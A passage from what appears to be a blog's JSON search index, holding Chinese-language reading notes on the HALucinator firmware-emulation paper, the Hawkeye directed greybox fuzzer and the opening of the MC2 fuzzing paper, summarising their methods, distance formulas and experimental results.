74.5%的库函数，而带有上下文匹配的 LibMatch 平均匹配了 87.4%。因此，几乎所有的 HAL 和中间件库都精确地位于二进制文件中。 上图可以看到在 16 个应用程序中，没有上下文匹配的 LibMatch 平均匹配了 74.5%的库函数，而带有上下文匹配的 LibMatch 平均匹配了 87.4%。因此，几乎所有的 HAL 和中间件库都精确地位于二进制文件中。\n5.2 Scaling of High-Level Emulation Handlers and Human Effort 实现处理程序是一项手动任务，因此需要量化实现处理程序的工作量。将实验中使用的处理程序分为三类:\n普通处理程序：只返回一个常量，通常用于硬件初始化函数 转化处理程序：将截取的函数参数转换为外设模型上的操作，它们不实现任何逻辑，而只是在获得模型的适当数据后调用模型。 内部逻辑处理程序：需要理解替换函数的内部逻辑 跨设备扩展 为了演示 HLE 如何允许一个 HAL 的仿真跨设备扩展，我们使用 NXP MCUXpresso HAL 的样本构建了一个实验，每个样本来自不同的板和 CPU。这些代表 NXPs 的每个主要 ARM 微控制器产品系列的芯片，包括 Kinetis、LPC 和i.MX，它们的设计和外设布局完全不同，因为它们是在以前独立的公司开发的。不管家族和血统如何，所有这些部分都共享相同的 HAL。结果，我们从 20 个不同的开发板获得了 uart_polling 示例的 20 个实例。之所以选择 uart_polling 示例，是因为几乎每个单板上都有 uart，而其他外设的存在因单板而异。然后，我们使用相同的 NXP UART 处理程序和外设模型来模拟这 20 个固件示例。具体来说，我们使用了三个处理程序，一个发送处理程序、一个接收处理程序和一个返回 0 的默认处理程序。不同固件在 HALucinator 配置上的唯一差异是 RAM/Flash 布局、时钟拦截和电源初始化函数，所有这些都是由普通的默认处理程序处理的。总共截获了 29 个独特的函数。每块板至少拦截 6 个功能，最多 9 个，平均 6.9 个。这表明相同的处理程序和模型可以用于支持多个产品系列。唯一的挑战是识别被拦截的时钟和电源初始化函数的名称。\n5.3Interactive Emulation Comparison 实验设置：\n使用 QEMU、Avatar2 [43] 和 HALucinator 交互式地重新托管表 1 中显示的 16 个固件样本 在这个实验中，使用 Avatar2 提供的 QEMU 的默认配置，并在没有硬件存在的情况下将固件加载并执行到 QEMU 中。在这种配置下，对 QEMU 中不支持的 MMIO 的任何访问都会出错。 HALucinator 对 LibMatch 匹配的函数进行高级替换，对于执行的任何 MMIO，实现了一个默认的 MMIO 处理程序，该程序对读取返回零，对写入静默忽略。 作者的一些解释和说明：\n作者指出如果模拟系统上能够执行与真实硬件相同的功能，那么外部行为就是“正确”的 所以 HALucinator 可以做到正确回应固件运行中对外设的请求 TCP/UDP 可以成功传输和物理硬件相同的数据 能够访问 HTTP 服务器固件样本上的相同页面 FatFs 示例能够在其文件系统内的相应文件中读取和写入所需数据 6LoWPAN 示例成功地相互通信 UART 示例能够通过它们的 UART 发送和接收数据并给出预期的响应 虽然作者指出无法验证和真实的物理硬件相比是否遵循了相同的代码路径，但是 HALucinatior 实现的模拟已经足够应用于其他的安全测试，比如模糊测试。 HALucinator 在所有情况下都能实现正确的黑盒行为——所有厂商、所有板子、所有固件样本 Avatar2 只成功模拟了 NXP UART 固件，因为这个固件轮询 MMIO 并且不使用任何中断。 对于 QEMU 来说，搞不定 MMIO，当发生任何 MMIO 时，QEMU 都挂了（总线故障） Avatar2 采用 MMIO 转发的方式，但是有的固件有启用了 SysTick 计时器，你 MMIO 一直不回应，回应的慢也会挂 HALucinator 拦截初始化 SysTick 计时器的 HAL 函数并替换为一个计数器来保持时间；使其能够避免这个问题 表 3 显示了每个固件使用的软件库以及 HALucinator 模拟的接口。对于每种技术，它显示了执行的唯一基本块的数量（“BB”），这表明固件执行了多少。它还显示外部输入和输出行为是否与在物理硬件上执行固件时观察到的匹配（外部行为正确 – “EBC”）。对于 Avatar2，我们报告转发到板子的读写次数（“Fwd R/W”），这表明 Avatar2 正确地转发了内存请求。对于 HALucinator，我们报告拦截的函数数量（“Funcs”）和默认 MMIO 处理的唯一地址数量。拦截的函数数量给出了使用 HALucinator 模拟固件所需工作量的度量，而使用默认处理程序的 MMIO 是对硬件的访问，这些访问可能会被进一步拦截 HAL 函数替换。 这个实验展示了 HALucinator 如何实现复杂固件的模拟，该固件在真实硬件上执行时具有与现有方法无法做到的相同的外部功能。HALucinator 在我们的样本固件上平均执行了超过 1, 000 个基本块，是 Avatar2 的 10 倍。来自三个不同制造商的四个不同板子的模拟展示了 HLE 支持各种硬件的能力，以及所有板子都使用相同外设模型的可扩展性，显示了它们在供应商和硬件平台之间的可扩展性。\n5.4 Fuzzing with HALucinator 巴拉巴拉，大概就是说找了好多漏洞。\n相关工作 函数识别和标记\nBinDiff [28, 55] 及其开源对应物 Diaphora [21] 使用图匹配技术有效且高效地比较两个程序。但并未考虑冲突。 特征提取技术包括基于函数前奏的签名 [31]，从系统调用的后向切片 [35]，以及来自符号执行的跟踪 [46, 47]。 匹配提取的特征已通过贝叶斯网络 [15]，神经网络 [33] 和局部敏感哈希 [24] 进行。 这些系统都不适用于标记固件中的函数：无法分析或执行 ARM Cortex-M 代码，由于 HAL 中函数的小尺寸和相似性，机器学习方法可用的信息不足，以及某些方法无法有效地处理冲突。 固件模拟\n最常见的方法采用硬件在环执行，如 AVATAR [58]，AVATAR2 [43] 和 SURROGATES [36]\n在这些系统中，物理目标设备与分析环境相连，通常使用调试端口，并在执行期间由标准模拟器使用其硬件外设。 受其对硬件的可见性限制——外设内部的状态与模拟器不同步 不支持中断或直接存储器访问 (DMA) 另一种方法 [19, 20] 模拟涉及使用高级操作系统（如 Linux）的存在作为抽象点，并用能够在模拟器中运行的版本替换固件的版本。这可以被认为是一种高级模拟，因为它使用用户内核屏障作为建模边界。然而，它只适用于具有文件系统映像的固件，该映像可以在不运行任何设备特定代码的情况下启动。在这项工作中，我们专门针对没有这样的操作系统的设备中发现的“blob”固件\n不足和讨论 HALucinator 完全基于 HAL，固件如果没有使用 HAL，那就干不了了 当编译器或库版本未知时，LibMatch 的有效性是有限的。函数匹配技术无法应对编译器引起的生成代码中的变化。LibMatch 的主要贡献是使用函数的上下文（被调用者/调用者）来消除二进制等效函数的歧义。 编写处理程序的时候对于普通程序的处理是不是有点太草率了 如何实现 DMA 的\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/halucinator-firmware-re-hosting-through-abstraction-layer-emulation/","summary":"中文译名：HALucinator: 通过抽象层仿真重新托管固件 作者：Abraham A. Clements 单位：桑迪亚国家实验室 国家： #美国 年份： #2020年 来源","title":"HALucinator Firmware Re-hosting Through Abstraction Layer Emulation"},{"content":"中文译名：hawkeye: 需求导向的灰盒模糊测试 作者：Hongxu Chen 单位：南洋理工大学 国家： #新加坡 年份： #2018年 来源： #ccs 关键字： #定向fuzzing #fuzzing #灰盒 代码地址： https://github.com/hongxuchen/Hawkeye 介绍网站：Hawkeye (google.com) 笔记建立时间： 2023-02-28 09:30\n摘要 目的：提高灰盒模糊器的指向性 方法：静态分析收集信息（调用图、函数和基本块级别的目标距离）；基于静态信息和执行跟踪评估执行的种子，生成动态指标，用于种子优先级、能量分配和自适应变异 创新：新颖的静态分析、动态指标生成 效果：相比于 AFL 和 AFLGo 等最先进的灰盒模糊测试器，Hawkeye 可以更快地到达目标站点并重现崩溃。特别是，Hawkeye 可以将暴露某些漏洞的时间从约 3.5 小时缩短至 0.5 小时。\n1引言 在静态分析提取信息后，动态分析中有几个挑战——如何动态调整不同策略，以便尽快到达目标站点。第一个挑战是如何正确分配能量给不同距离的输入，以及如何优先考虑离目标更近的输入。这推导出第三个期望属性P3。第二个挑战是如何适应性地改变变异策略，因为GFs可能在粗粒度（例如批量删除）和细粒度（例如按位翻转）两个层次上拥有各种变异操作符。这推导出第四个期望属性P4。因此，第二个问题是对DGF中使用的动态策略进行适当调整。\n背景： 在一些测试场景下需要定向 fuzzing 漏洞重现 在一个平台上发现了漏洞，那么在其他类似平台是否有相似漏洞 测试补丁 最先进（2018 年前）的定向灰盒 fuzzer 是 AFLGO AFLGo 将到达目标站点的可达性视为一种优化问题，并采用元启发式方法来促进具有更短距离的测试种子。这里，距离是根据输入种子的执行跟踪中到目标基本块的平均基本块权重计算的，其中权重由程序的调用图和控制流图中的边决定，元启发式方法为模拟退火。 挑战： 拥有一个合适的静态分析来收集 DGF 所需信息。 如何有效的计算到 target sites 的有效距离而不损害有些期望特征，特别地，它应该有助于保留种子多样性 AFLGO 优先分配能量给距离 target sites 最短的种子，但是这样反而会导致饿死那些更快触发漏洞的种子。（因为计算方法的问题，可能算出来的最短距离并不是直观上的最短距离）（这个貌似在 MC2 中有提及，等我去翻翻） LibFuzzer 认为不考虑所有的路径可能会漏掉隐藏在较长路径深处的错误 如何减小静态分析的开销 对 DGF 中使用的动态策略进行适当调整 如何分配能量 如何适应性（动态）的调整变异策略 目的： 基于以上的挑战，作者总结了 DGF 应该有的四个属性（摘要里提到的那个 feature） P1 DGF 应该具有一个基于距离的强大机制，能够通过考虑所有到目标的轨迹并避免对某些轨迹的偏见来指导定向模糊测试。 P2 DGF 应该在静态分析中平衡开销和效用。 P3 DGF 应该优先安排种子以快速到达目标站点。 P4 当种子覆盖不同程序状态时，DGF 应采用自适应变异策略。 方法： 对于 P1，使用基于增强的相邻函数距离来计算函数级距离和基本块距离，同时在模糊测试中将静态分析结果和运行时执行信息结合，计算执行轨迹和 target sites 基本块轨迹距离和覆盖函数相似度。（说白了就是动静结合） 对于 P2，应用基于调用图（CG）和控制流图（CFG）的分析，即函数级可达性分析、函数指针（间接调用）的指向分析和基本块度量（§4.1）。（这怎么平衡开销？） 对于 P3，我们建议将基本块轨迹距离和覆盖函数相似度结合起来解决功率调度问题（§4.4）和种子优先级问题（§4.6）。 对于 P4，我们建议根据可达性分析和覆盖函数相似度应用自适应变异策略（§4.5）。 创新： 增强的相邻函数距离 基本块轨迹距离和覆盖函数相似度相结合指导能量调度 可达性分析和覆盖函数相似度指导变异策略 效果： 2期望的 DGF 特性 2.1Motivating Example 作者举了一个例子来展示最短路径的弊端： 如图所示，这个错误是在 GNU binutils 中的 nm 中触发的，崩溃函数是 T，图二展示了触发漏洞的路径要长于其他路径，所以该漏洞对于一般的灰盒模糊很难发现。在我们进行的 10 次不同运行中，AFL [48]都无法在 24 小时内检测到这个漏洞。\n现有 DGF 的挑战根源于以下几个方面： 1）目标函数可能出现在 PUT 的多个位置，多条不同的轨迹可能通向目标。 2）由于调用图主要影响轨迹距离（与目标站点的不相似性）的计算，因此需要准确建立；特别是，函数之间的间接调用不应被忽略。 2.2 定向模糊的期望性质 P1：DGF 应定义一种强大的基于距离的机制，可以通过避免对某些路径的偏见并考虑所有路径到目标来指导有向模糊测试。 指导机制可以提供所有可能通往目标的路径的知识，并通过逐渐减少距离来引导突变朝着它。并且所有路径到达目标的距离都应正确计算，以便与其他路径相比分配更多能量给所有可达到目标的路径。 重点在于距离的正确（有效）计算 P2：DGF 应在静态分析中平衡开销和效用。 对于难以分析的信息（C/C++程序中的间接函数调用无法直接从源代码或二进制指令观察 call site），权衡分析的开销和效用 并非所有调用关系都应被平等对待。某些函数在其调用函数中出现多次，那么对于出现频率小的函数而言，该类函数应该离其调用函数“更近” 然而，在静态短语中建模实际分支条件是不切实际的，因为静态分析固有的局限性。例如，对于一个非平凡的代码段，在运行时很难预测谓词的真分支是否比其假分支执行得更频繁。另一方面，在灰盒模糊测试设置中动态跟踪符号条件将太耗时。 P3：DGF 应选择并安排种子以快速到达目标站点。 在有向模糊测试中，模糊测试的目标不是尽快达到覆盖率的上限，而是尽快到达特定目标。所以能量调度和种子优先级都应该以尽快达到 target sites 为标准 它们都可以通过基于距离的机制来指导 P4：当种子覆盖不同的程序状态时，DGF 应采用自适应突变策略。 通常，突变器可以分为两个级别：细粒度突变（例如位翻转）和粗粒度突变（例如块替换）。尽管没有直接证据表明细粒度突变很可能保留执行跟踪，但人们普遍认为粗粒度随机突变很可能大大改变执行跟踪。 因此，期望的设计是当一个种子已经到达目标站点（包括目标行、基本块或函数）时，它应该给予较少的粗粒度突变机会。（意思就是当种子已经达到 target site，就让它细粒度突变，就是变化不要那么大，这样就更可能突变到另一条可以到达 target site 的路径） 2.3 AFLGO 的解决方法 对于 P1。对于图 2，基于 AFLGo 定义的距离公式，分配给图 2的能量将是⟨a, e, T, Z⟩\u0026gt;⟨a, e, f, Z⟩\u0026gt;⟨a, b, c, d, T, Z⟩。这是有问题的：正常轨迹⟨a, e, T, Z⟩被过分强调；崩溃轨迹⟨a, b, c, d, T, Z⟩却被认为是最不重要的，甚至比未达到目标 T 的轨迹⟨a, e, f, Z⟩还要不重要。 P2。AFLGo 只考虑显式调用图信息。这将会忽略函数指针的调用，任何通过函数指针进行调用的函数在 AFLGO 看来都是不可达。所以 AFLGO 静态分析得到的信息是不完整的。 此外作者指出 AFLGO 调用方和被调用方的距离的计算方式比较简单，忽略了不同的调用方式和调用次数。 （这几个缺点不都是针对 P1 的吗，怎么就挪到 P2 了） P3。AFLGO 采用模拟退火的算法，倾向于给更接近目标的种子更多的能量，同时也有措施来促进更好的变异（这里要回看一下 aflgo，有点忘了） P4。AFLGo 的突变算子来自于 AFL 的两种非确定性策略:1) havoc，即纯粹随机的突变，如位翻转、块替换等; 2) splice，它从两个现有种子的一些随机字节部分生成种子。这种非确定性策略太随意，可能会破坏或忽略更好的种子。AFLGo 缺乏自适应突变策略。 总结。以 AFLGo 为例，我们可以总结以下几点改进 dgf 的建议: (1) 对于 P1，需要更准确的距离定义，以保留迹的多样性，避免对短迹的关注。 (2) 对于 P2，直接调用和间接调用都需要分析; 在静态距离计算过程中，需要区分不同的呼叫模式。 (3) 对于 P3，需要对当前的功率调度进行调节。距离引导的种子优先级也是必要的。 (4) 对于 P4, DGF 需要一种自适应突变策略，当种子与目标距离不同时，最优地应用细粒和粗粒突变。 3 方法概述 3.1 静态分析 输入为程序源码和 target sites（以所在基本块和函数的形式） 静态分析阶段输出带有基本块级距离信息的程序二进制文件 包含式指针分析精确构建仪表化目标程序的调用图，对于每个函数构建控制流图 根据 CG 和 CFG 计算几个实用程序，用于促进 Hawkeye 中的定向性，实用程序如下： （1）函数级距离是基于 CG 计算增强的相邻函数距离（§4.2）。这个距离被用来计算基本块级别的距离。它也在模糊循环中用于计算覆盖函数相似度（§4.4）。 （2）基本块级别的距离是根据函数级别的距离、CG 和函数的 CFGs 计算出来的。这个距离被静态地仪表化，用于每个被认为能够到达目标站点之一的基本块。在模糊循环中，它也被用来计算基本块追踪距离（§4.4）。 （3）目标函数追踪闭包是根据 CG 为每个目标站点计算出来的，以获得能够到达目标站点的函数。它在模糊循环中用于计算覆盖函数相似度（§4.4）。 最后将基本块级别的距离仪表化源代码，重新编译，得到用于模糊的二进制程序 3.2 模糊循环 模糊器从优先级种子队列中选择一个种子，利用能量分配函数进行能量调度\n能量分配函数是覆盖函数相似性和基本块跟踪距离的组合，对于每个在变异过程中新生成的测试种子，在捕获其执行跟踪后，模糊器将根据实用程序（§3.1）计算覆盖函数相似性和基本块跟踪距离。 对于每个输入执行跟踪，其基本块跟踪距离计算为累积基本块级别距离除以执行基本块总数；其覆盖函数相似性根据当前执行函数与目标函数跟踪闭包的重叠以及函数级别距离计算。 在能量确定后，模糊器根据变异器对种子的粒度自适应地分配两种不同类别的变异预算（§4.5）。然后，模糊器评估新生成的种子，优先考虑那些具有更多能量或已达到目标函数的种子（§4.6）。\n4方法 4.1 图的构建 对整个程序的函数指针应用基于包含的指针分析来生成 CG 目的：识别程序的间接调用 方法：这种算法的核心思想是将输入程序中形如 p := q 的语句转换为形如“q 的 points-to 集合是 p 的 points-to 集合的子集”的约束。计算了整个程序内函数指针的 points-to 集合，从而得到一个包含所有可能直接和间接调用的相对精确调用图。（这种方法是上下文不敏感和流不敏感的） 调用图用户计算函数级距离 基于 LLVM 的 IR 生成每个函数的 CFG CG 计算函数级距离 CFG+CG 计算基本块距离 4.2 增强的相邻函数距离 作者认为在计算距离的时候应该考虑被调函数的调用模式（概率），概率越大，距离应当越近。如下图所示，a 中的 fb 肯定会被调用，而 b 中的 fb 和 fc 的调用概率相同。所以 a 中 fa 到 fb 的距离要近于 fc，b 中 fa 到 fb 和 fc 的距离相同。 作者提出两个指标来增强直接调用的距离\n$\\Phi(C_N)=\\frac{\\phiC_N+1}{\\phiC_N}$ $C_N$ 是某个被调用函数的调用点出现次数，次数越大距离越小（$\\Phi(C_N)$ 用来表示这种效应），其中φ是一个常数值（通常φ= 2） $\\Psi (C_B)=\\frac{\\psiC_B+1}{\\psiC_B}$ $C_B$ 是调用函数包含至少一个调用点的基本块的数量，当拥有调用点的分支越多，包括被调函数的执行跟踪也越多 （$\\Psi(C_B)$ 来表示这种效应），ψ是一个常数值（通常ψ= 2）。 这两个因子都是单调递减函数，随着 $C_B、C_N$ 增大逐渐收敛到 1 给定一个直接函数调用对（f1，f2），其中 f1 是调用者，f2 是被调用者，则 f1 和 f2 之间的原始距离为 1，首先计算因子 $\\Phi 和\\Psi$，然后相乘得到我们的调整因子，调整因子乘上 AFL 计算的距离就是最终结果 ${d}\u0026rsquo; f (f1, f2) = Ψ(f1, f2) · Φ(f1, f2) (1)$ 4.3 指向性效用计算 函数级距离 给定一个函数 n，它到目标函数集合 $T_f$ 的距离为： $R(n,T_f)={t_f|reachable(n,t_f)}$，表示在 CG 中 n 能到达的 tf 的集合，并且 df 是基于增强距离的迪杰特斯拉最短路径\n基本块级距离 给定一个基本块 m，它到目标基本块 Tb 的距离定义为： 如果基本块 m 属于目标基本块 Tb，距离为零 如果基本块 m 属于 Transb，距离为属于 $C_f^T(m)$ 的函数到目标函数的最小值与 c 的乘积 在基本块 m 内调用的函数集合表示为 Cf (m)，$C_f^T(m)={n|R(n, Tf)\\ne∅,n∈C_f(m)}$，$C_f^T(m)$ 是基本块 m 中的可达目标函数的函数的集合 $Trans_b={m|∃G(n),m∈G(n),n∈F,C_f^T(m)\\ne∅}$ Transb 和 CTf 互为“倒数”吧，Transb 表示含有可达目标函数的函数的基本块的集合 否则距离需要通过一个中间基本块 t 来间接到达 $d_{b}^{o}(m1,m2)$ 定义为在 CFG G (n) 中从 m1 到 m2 的最小边数 请注意，方程 2 和 3 本身与 AFLGo [6]中的相同。区别在于 df 的计算是增强的。\n目标函数跟踪闭合 实用程序ξf（Tf）表示目标函数 Tf 的所有前任，由于静态分析的局限性，我们选择不排除那些被认为无法从入口函数到达的前任。\n4.4 能量调度 基本块跟踪距离 种子 s 到目标基本块 Tb 的距离定义为： 其中ξb (s) 是种子 s 的执行跟踪，包含所有执行的基本块。 方程 4 的基本思想是：对于 s 的执行跟踪中的所有基本块，我们计算到目标基本块 Tb 的平均基本块级距离。请注意，方程 4 也与 AFLGo [6]中的相同。 然后应用特征缩放归一化来获得最终距离： ，其中 minD（或 maxD）是曾经遇到的最小（或最大）距离。\n覆盖函数相似度。 度量衡量种子的执行跟踪与目标执行跟踪在函数级别上的相似性。 我们不跟踪基本块级别的跟踪相似性，因为这会引入相当大的开销。 根据直觉计算相似性，即覆盖“预期跟踪”中更多函数的种子将有更多机会被突变以到达目标。通过跟踪当前种子覆盖的函数集（记为ξf (s)）并将其与目标函数跟踪闭包ξf (Tf) 进行比较来计算此相似性。在图 2 中，ξf (abcdTZ)={a, b, c, d, T}，ξf (aeTZ)={a, e, T}和ξf (aefZ)={a, e}。\ndf (f , Tf ) 是使用方程 2 计算的函数级距离。与 ds 类似，也应用了特征缩放归一化，并且最终相似度表示为 cs 。请注意，这种相似度度量是我们方法中独特提出的。\n调度 调度处理的问题是给定种子将被分配多少变异机会。 如果当前种子的执行轨迹和达到目标点的任何轨迹越相似，则会被分配到的能量越多。 但是，纯粹基于跟踪距离的调度可能会偏爱某些跟踪模式。对于 AFLGo，如§2.2.2 所述，较短路径将被分配更多能量，这可能会使仍然可到达目标站点的较长路径饥饿。 为了缓解这种情况，作者提出了一种考虑了跟踪距离（基于基本块级别距离）和跟踪相似性（基于覆盖函数相似性）的幂函数： 与 AFLGO 的方法相比，该函数平衡了可以到达目标的较短路径和较长路径的影响\nds 由 CG 和 CFG 计算，但是主要受 CG 影响，因为有放大洗漱 c；cs 仅由 CG 计算 ds 不惩罚不会导致目标的跟踪，而 cs 通过 ξf (s)（通过跟踪函数级别跟踪）和 ξf (Tf ) 的并集来惩罚它们 给定多个可以到达目标的跟踪，ds 偏爱长度短的那些，但 cs 偏爱预期跟踪中公共函数长度较长的那些。 作者指出该函数也存在偏向某些路径的问题，该函数会对与到达目标函数的执行轨迹更相似的种子，即使无法到达目标函数，分配更多能量，但是作者认为这不是问题，因为此类种子即使不会到达目标，但是更容易变异为可以到达目标函数的种子。\n4.5 适应性突变 上一节计算得到的能量（也称为应用突变的次数）将会作为变异策略的输入。但是每种类型的突变器的突变次数分配仍是问题（两种类型突变器，粗粒度和细粒度）\n对于粗粒度：\n混合变异：以下操作的组合 删除一块字节，用缓冲区中其他字节覆盖给定块 删除某些行 多次复制某些行 语义突变：当目标程序已知处理语义相关输入文件（如 javascript、xml、css 等）时使用。其中包括三种元突变，在随机 AST 位置插入另一个子树、删除给定 AST 和用另一个 AST 替换给定位置。 拼接：队列中两个种子的交叉和后续的混合变异 算法大意是判断函数是否可以到达目标函数，如果不能，则粗粒度变异的比重要大一点，如果可以细粒度变异的比重大一点。不过无论是否可以到达目标函数，种子都需要进行粗细粒度的变异。Getscore 函数就是方程 6 算法 2 描述了粗粒度变异的算法，给定种子 s 和变异迭代次数 i，对种子进行混合变异和拼接，在必要的情况下进行语义突变，并且降低另外两种编译的比例。作者给出了进行语义突变的条件：\n检测到输入文件是语义相关的输入文件，如 javascript、xml、css 等 先前的语义变异没有失败 在实践中，常数分配经验值：γ = 0.1，δ = 0.4，σ = 0.2，ζ = 0.8。 （对于细粒度的变异，作者采用了一般的方法）\n4.6 种子优先级 作者认为因为静态分析的局限性，种子的优先等级可能会有偏差，并且队列的插入算法代价昂贵，实践中并不实用。因此作者建立了三个队列，优先级依次降低，队列中没有优先级。 当新种子可以覆盖新的轨迹或者与目标种子具有更大的相似性值（即功率函数值）或者可以到达目标函数式，放到第一队列，具有最高优先级 否则新种子放到第二队列 不是新种子的种子放到第三队列 在实践中，Hawkeye 还应用 AFL 的循环桶方法（见[49]）来过滤掉大量在循环迭代方面不带来新覆盖率的“等效”种子。 5 评估 静态检测基于 AFL 的 LLVM 模式 指针分析基于 SVF 的过程间静态值流分析工具 动态模糊器基于我们的 Rust 实现的 AFL。基础框架，称为 Fuzzing Orchestration Toolkit Hawkeye 的检测包括三个部分：1）跟踪执行轨迹的基本块 ID 2）确定基本块轨迹距离的基本块距离信息 3）跟踪已覆盖函数的函数 ID。 5.1 评估设置 静态分析真的值得付出努力吗? 鹰眼在重现目标崩溃方面的表现有多好? 在 Hawkeye 中动态策略的效果如何? 鹰眼到达特定目标地点的能力如何?\n数据集 (1) GNU Binutils[5]是 GNU/Linux 平台上使用的二进制分析工具的集合。该基准测试也用于其他一些作品，如[6, 7, 24]。 (2) MJS[39]是一个用于 C/ c++的嵌入式 JavaScript 引擎，用于物联网开发。由于 AFLGo 在实现上的局限性，它被用来直接比较 Hawkeye 和 AFLGo。 (3) Oniguruma[23]是一个通用的正则表达式库，被多个世界著名的项目使用，如 PHP[33]。 (4) Fuzzer Test Suite[18]是一套用于模糊引擎的基准测试。它包含了几个具有代表性的实际项目。\n评估工具 (1) AFL 是目前最先进的 GF。它忽略 PUT 的所有目标信息，只执行“基本块转换”插装。 (2) AFLGo 是基于 AFL 的最先进的 DGF。与 AFL 相比，它还能显示基本的块距信息。 (3) HE-Go 是我们的静态分析程序生成基本块级距离的模糊器 (图 3)，但动态模糊是由 AFLGo 进行的。\n5.2 静态分析统计 Size 表示程序 LLVM bitcode 形式的大小 Ics 表示二进制文件中间接调用 call sites 的数量，通过计算没有明确已知被调用者的调用站点来计算 Cs 表示 call sites 的数量 ics/cs 表示所有调用站点中间接调用的百分比 最后一列表示生成调用图所需的时间，这占据了大部分时间。 从表中可以看出，间接调用的占比还是相对比较大的，所以建立精确的调用图还是很有必要的 CN \u0026gt; 1 和 CB \u0026gt; 1 出现次数也很多，这显示了考虑不同模式呼叫关系的重要性\n5.3 崩溃暴露能力 在这个实验中，我们直接比较了Hawkeye与其他模糊器在一些已知崩溃上的崩溃暴露能力。\n针对 Binutils 的崩溃再现。 起初，我们打算在实验中直接将 GNU Binutils 与 AFLGo 进行比较，因为它是[6]中证明 AFLGo 定向性的重要基准。然而，我们发现 AFLGo 在生成静态距离方面存在一些问题[2]。最重要的是，计算距离需要太长时间。结果，在我们对 GNU Binutils 2.26 进行 AFLGo 静态分析时，它未能在 12 小时内生成包含仪器距离信息的“distance. cfg. txt”5。尽管 AFLGo 仍然可以在没有距离信息仪器的情况下进行模糊测试，但如果没有任何距离输入，模糊测试过程就不再是定向的。因此，我们收回了[6]中关于 GNU Binutils 基准测试 6 的结果与我们的比较。我们完全按照[6]中的评估设置进行每个实验 20 次，时间预算设为 8 小时；初始输入种子文件只包含一个换行符（由 echo “” \u0026gt; in/file 生成）。我们指定的目标站点基于它们的 CVE 描述和崩溃的回溯。我们将 Hawkeye 与 AFLGo 和 AFL 进行比较；结果如表 2 所示。在 AFLGo 论文中，使用了 A12 度量[42]来显示根据所有运行情况一个模糊器优于另一个模糊器的可能性。由于我们无法获得他们实验中每次运行的结果，在表 2 中忽略了这一点。（懒得总结，直接翻译） （在实验中，TTE 通常指的是“时间到事件”（Time-To-Event），它表示从实验开始到某个特定事件发生所经过的时间。在模糊测试中，TTE 可以指从模糊测试开始到发现崩溃所经过的时间。μTTE 是“平均时间到事件”（Mean Time-To-Event）的缩写，它表示在多次实验中，从实验开始到某个特定事件发生所经过的平均时间。在模糊测试中，μTTE 可以指从模糊测试开始到发现崩溃所经过的平均时间。） Run 是命中漏洞的轮数\n针对 MJS 的崩溃重现 为了直接比较Hawkeye和AFLGo的性能，我们选择了一个名为MJS的项目，它包含一个源文件，结果在表3中。我们使用这个项目与AFLGo进行直接比较，因为AFLGo花费太多时间或无法为其他项目（如Oniguruma、libpng等）生成距离信息。在MJS上，AFLGo平均花费13分钟生成不同目标的基本块距离。在实验过程中，初始输入种子文件都来自项目的测试目录。目标是从项目的GitHub页面报告的崩溃中选择的，它们对应四类漏洞，分别是整数溢出（#1）、无效读取（#2）、堆缓冲区溢出（#3）和使用后释放（#4）。我们可以观察到以下事实：1）在#1和#2上，Hawkeye取得了最好的结果，在两种情况下都有最多的命中轮数和最短的μTTE。就命中轮数而言，Hawkeye在5次运行中发现了#1的错误，在7次运行中发现了#2的错误，而对于另外两个工具，它们只在2次运行中检测到两次崩溃。值得注意的是，这种情况并非易事，并且Hawkeye将μTTE从约3.5小时减少到0.5小时。2）对于所有工具都在8轮内重现崩溃的#3来说，Hawkeye仍然在μTTE方面取得了极大改进，并且使用不到其他工具四分之一μTTE。3）对于所有工具都在所有轮次内重现崩溃并且它们之间μTTE差异不显著的#4来说。至于A12，我们可以看到Hawkeye表现出非常好的结果，例如，在#2中值都是0.95 ，这意味着Hawkeye有95% 的把握比其他两个工具表现更好。 （后续基本都是对实验结果的展示，没有什么总结的必要）\n5.6 有效性威胁 内部威胁（缺陷）：\n内部算法存在几个预定义的阈值因子，这些因子的值都是经验值，需要进行实验找出最佳配置 静态分析依赖的 LLVM 和 SVF 可能会造成影响，或许可以找到更好的工具来集成 外部威胁：\n实验数据集还是不够丰富 6 相关工作 SeededFuzz [45] 使用各种程序分析技术来促进初始种子的生成和选择，从而帮助实现有向模糊测试的目标。配备了改进后的种子选择和生成技术，SeededFuzz 可以到达更多关键站点并发现更多漏洞。\nDirected Symbolic Execution (DSE) 是一种与 DGF 相关的技术，它也旨在执行 PUT 的目标站点。已经提出了几项 DSE 工作 [17、19、21、28、29]。这些 DSE 技术依赖于重量级程序分析和约束求解来系统地到达目标站点。\n但是 DES 技术存在路径爆炸问题 污点分析也被广泛用于促进有向白盒测试 [12、16、24、34、44]。在模糊测试中使用污点分析的关键直觉是确定输入的某些部分应该优先变异。这样，模糊测试器可以大大减少到达某些期望位置的搜索空间。\nFairfuzz [24] 中的罕见分支或 TaintScope [44] 中与校验和相关的代码。 但是，目标明确的场景下，如补丁测试和崩溃复现，这些技术没有优势。 这个貌似在 MC2 中有提及，等我去翻翻\n看一看其他资料，搞懂那个执行跟踪为啥没有 f\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/hawkeye-towards-a-desired-directed-grey-box-fuzzer/","summary":"中文译名：hawkeye: 需求导向的灰盒模糊测试 作者：Hongxu Chen 单位：南洋理工大学 国家： #新加坡 年份： #2018年 来源： #ccs 关键字： #定向","title":"Hawkeye： Towards a Desired Directed Grey-box Fuzzer"},{"content":"MC2 : 严格而高效的定向灰盒模糊法\nabstract 背景：most existing directed greybox fuzzers do not provied any theoretical analysis of their performence or optimality.大多数现有的有向灰盒模糊器都没有对其性能或最优性提供任何理论分析。\n方法：\n引入了一个复杂性理论框架，将灰盒模糊作为先知引导的搜索问题，通过查询oracle来接收关于输入空间的反馈。使用模糊算法寻找目标达到输入所需的oracle查询数量作为性能指标。 基于框架，设计了一个随机有向灰盒模糊算法 成果：在具有挑战性的基准测试(Magma和Fuzzer测试套件)中比最先进的定向灰盒模糊器的性能平均高出两个数量级(即134×)。MC2还发现了15个以前未被发现的bug，这是其他最先进的定向灰盒模糊器无法发现的\nintroduction 